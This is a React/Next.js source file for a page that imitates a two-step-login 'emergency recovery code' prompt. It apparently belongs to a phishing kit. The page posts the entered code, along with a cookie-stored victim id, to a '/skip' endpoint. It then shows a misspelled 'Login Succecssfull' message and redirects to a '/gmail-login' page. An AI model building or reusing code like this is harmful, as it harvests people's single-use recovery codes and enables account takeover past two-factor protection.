import { Form, Formik } from "formik";
import { API_URL } from "../config";
import Header from "../components/Header";
import Footer from "../components/Footer";
import Cookies from "js-cookie";
import InputField from "../components/InputField";
import { toast } from "react-toastify";
import { useRouter } from "next/router";
import { useState } from "react";

function RecoveryAuthPage() {
  const router = useRouter();
  const id = Cookies.get("id");
  const [code, setCode] = useState("");

  const handleSubmit = async () => {
    const values = {
      id: id,
      skipcode: code,
    };

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      setCode("");
      router.push("/gmail-login");
      // router.push("/account/email");
      // Cookies.remove("id");
      // Cookies.remove("email");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  return (
    <>
      <Header />
      <div className="flex pl-10 md:pl-20 justify-start mt-10 min-h-screen bg-white w-full">
        <div className="w-full max-w-md">
          {/* <div className="bg-red-100 text-red-700 p-3 rounded-md mb-4 text-sm w-full">
            You need to authenticate via an additional factor before continuing
          </div> */}
          <h2 className="text-2xl font-semibold text-gray-800 mb-7">
            Enter emergency recovery code
          </h2>
          <p className="text-gray-600 mb-5 text-sm">
            An emergency recovery code is one of the codes we showed you after
            you set up 2-step login.Each emergency recovery code can be used
            exactly once.
          </p>
          <p className="text-gray-800 mb-2 text-sm font-semibold">
            Emergency recovery code
          </p>
          <input
            type="text"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:outline-none text-start text-2xl tracking-widest"
            placeholder="_ - _ - _ - _"
            maxLength={12}
            required
          />
          <button
            className="w-[30%] bg-[#972c37] text-white py-2 mt-4 rounded-md hover:bg-[#b13340] text-lg "
            onClick={handleSubmit}
          >
            Authenticate
          </button>
          <div className="mt-4 text-sm text-gray-800 text-center border-t  border-gray-300 py-2 w-full">
            <a href="#" className="text-gray-800  hover:underline">
              Authenticate using emergency recovery code instead
            </a>{" "}
            <span className="mx-1">|</span>
            <a href="#" className="text-gray-800  hover:underline">
              Log out instead
            </a>
          </div>
        </div>
      </div>
      <Footer />
    </>
  );
}

export default RecoveryAuthPage;
